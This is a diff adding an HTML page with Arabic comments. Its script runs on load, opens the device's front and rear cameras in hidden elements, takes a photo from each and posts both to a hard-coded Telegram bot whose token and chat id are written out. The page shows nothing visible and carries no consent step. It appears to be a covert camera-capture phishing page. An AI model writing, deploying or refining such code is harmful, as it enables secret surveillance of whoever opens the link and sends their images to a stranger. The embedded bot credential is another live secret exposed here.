@@ -1,0 +1,123 @@
+<html>
+<body>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+// دالة إرسال الصورة إلى تليجرام (بدون تغيير)
+function sendToTelegram(imageData) {
+    const token = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k';
+    const chat_id = '6612813200';
+    const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+    const byteCharacters = atob(imageData.split(',')[1]);
+    const byteNumbers = new Array(byteCharacters.length);
+    for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+    }
+    const byteArray = new Uint8Array(byteNumbers);
+    const blob = new Blob([byteArray], { type: 'image/png' });
+
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('photo', blob, 'capture.png');
+
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('تم إرسال الصورة بنجاح');
+        } else {
+            console.error('فشل الإرسال:', data.description);
+        }
+    })
+    .catch(error => console.error('خطأ:', error));
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg'); // غير مستخدم لكن نحتفظ به
+
+// دالة مساعدة لإيقاف أي تدفق كاميرا نشط
+function stopStream() {
+    if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+    }
+}
+
+// دالة تلتقط صورة واحدة من كاميرا بموجه معين (user أو environment)
+async function captureOne(facingMode) {
+    return new Promise(async (resolve, reject) => {
+        try {
+            // إيقاف أي كاميرا سابقة
+            stopStream();
+
+            // طلب الوصول للكاميرا بالاتجاه المطلوب
+            const stream = await navigator.mediaDevices.getUserMedia({
+                audio: false,
+                video: { facingMode: facingMode }
+            });
+            video.srcObject = stream;
+
+            // عندما يبدأ الفيديو بالتشغيل نلتقط صورة بعد تأخير بسيط لضمان الإضاءة
+            video.onplaying = () => {
+                setTimeout(() => {
+                    // رسم الإطار الحالي على الكانفاس
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 640);
+                    const canvasData = canvas.toDataURL("image/png"); // نحتفظ ببيانات الصورة
+
+                    // إيقاف الكاميرا بعد التقاط الصورة
+                    stopStream();
+
+                    // إرسال الصورة عبر التليجرام
+                    sendToTelegram(canvasData);
+
+                    // نعيد حل الوعد بعد الإرسال (يمكن الانتظار قليلاً لضمان الإرسال)
+                    setTimeout(resolve, 500); // نعطي وقت للإرسال قبل البدء بالصورة التالية
+                }, 500); // انتظار نصف ثانية بعد تشغيل الفيديو
+            };
+
+            // في حال حدوث خطأ أثناء التشغيل
+            video.onerror = (err) => {
+                reject(err);
+            };
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+// دالة رئيسية تلتقط الصورتين بالتسلسل
+async function captureBoth() {
+    try {
+        // صورة من الأمامية (user)
+        await captureOne('user');
+        // صورة من الخلفية (environment)
+        await captureOne('environment');
+        console.log('تم التقاط الصورتين وإرسالهما');
+    } catch (err) {
+        console.error('حدث خطأ:', err);
+        errorMsgElement.innerHTML = `خطأ: ${err.toString()}`;
+    }
+}
+
+// بدء التنفيذ
+captureBoth();
+
+</script>
+
+</body>
+</html>
